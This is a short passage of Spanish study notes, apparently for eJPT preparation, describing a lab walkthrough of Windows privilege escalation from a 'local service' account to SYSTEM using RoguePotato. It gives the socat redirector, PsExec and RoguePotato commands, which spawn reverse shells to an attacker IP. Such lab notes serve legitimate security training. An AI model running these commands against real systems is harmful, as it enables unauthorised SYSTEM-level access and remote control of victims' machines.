
- Configure un redirector de socat en Kali, reenviando el puerto Kali 135 al puerto 9999 en Windows:

```
sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.94.6:9999
```

- Comience un oyente en Kali. Simule la obtención de un shell de cuenta de servicio iniciando sesión en RDP como usuario administrador, iniciando un símbolo del sistema elevado (haga clic derecho -> ejecutar como administrador) y utilizando PSExec64.exe para activar el ejecutable reverse.exe que creó con los permisos de la cuenta "servicio local:

```
C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
```

- Comience otro oyente en Kali.

- Ahora, en el shell inverso "servicio local" que activó, ejecute el exploit RoguePotato para activar un segundo shell inverso que se ejecuta con privilegios SYSTEM (actualice la dirección IP con su IP Kali en consecuencia):

```
C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
```

enlace:
[[Local/Ciberseguridad/HACKING/CERTIFICACIONES/EJPT/Preparacion-Ejpt]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Herramientas]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Token Impersonation - PrintSpoofer]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Generate a Reverse Shell Executable]]